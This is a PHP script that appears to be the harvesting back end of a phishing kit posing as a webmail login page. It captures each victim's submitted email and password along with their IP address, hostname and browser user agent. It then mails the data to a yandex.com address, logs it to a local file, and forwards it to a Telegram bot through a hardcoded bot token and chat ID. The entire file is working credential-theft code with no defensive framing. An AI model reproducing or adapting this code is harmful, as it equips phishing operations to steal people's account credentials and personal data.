<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------+ ServerData WEBMAIL 2024 +-------------\n";
$message .= "USER : ".$_POST['email']."\n";
$message .= "PASS : ".$_POST['password']."\n";
$message .= "============= [ Ip & Hostname Info ] ==============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent: $useragent\n";
$message .= "-----------+ Powered By at Abilitytiger +-----------\n";

$send = "norereply@yandex.com";

$subject = "Login-ServerData";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);

mail($send,$subject,$message,$headers);

$fp = fopen("log1ns.txt","a");
fputs($fp,$message);
fclose($fp);
	
//report to telegram
function sendMessage($chatID, $messaggio, $token) {
    echo "sending message to " . $chatID . "\n";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$token = "6826179991:AAE5NHOgpOyBiRzjZSU1hoZAl1P_BJGJMWk";
$chatid = "803547119";
sendMessage($chatid, $message, $token);

?>
